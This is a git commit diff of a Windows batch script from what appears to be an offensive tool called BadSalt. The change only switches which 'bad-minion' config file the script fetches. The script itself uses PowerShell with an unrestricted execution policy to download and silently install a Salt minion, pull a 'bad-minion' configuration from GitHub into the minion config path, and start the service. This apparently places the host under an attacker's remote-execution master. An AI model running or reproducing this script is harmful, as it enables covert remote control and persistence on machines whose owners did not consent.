cd73773b3be79bdcba28dd407b3b303eefa6a872
Injection <cerdmann@injecti0n.org>
2019-02-10 18:06:54 -0500

    windows specific conf for newlines

--- bad-minon-windows.bat
+++ bad-minon-windows.bat
@@ -1,6 +1,6 @@
 powershell -NoProfile -ExecutionPolicy unrestricted -Command (new-object System.Net.WebClient).Downloadfile('https://repo.saltstack.com/windows/Salt-Minion-2018.3.3-Py2-AMD64-Setup.exe', 'C:\Windows\Temp\saltstack.exe')
 C:\Windows\Temp\saltstack.exe /S /master=salt
 del C:\Windows\Temp\saltstack.exe
-powershell -NoProfile -ExecutionPolicy unrestricted -Command (new-object System.Net.WebClient).Downloadfile('https://raw.githubusercontent.com/3ndG4me/BadSalt/master/bad-minion.conf', 'C:\salt\conf\minion')
+powershell -NoProfile -ExecutionPolicy unrestricted -Command (new-object System.Net.WebClient).Downloadfile('https://raw.githubusercontent.com/3ndG4me/BadSalt/master/bad-minion-windows.conf', 'C:\salt\conf\minion')
 sc start salt-minion
 
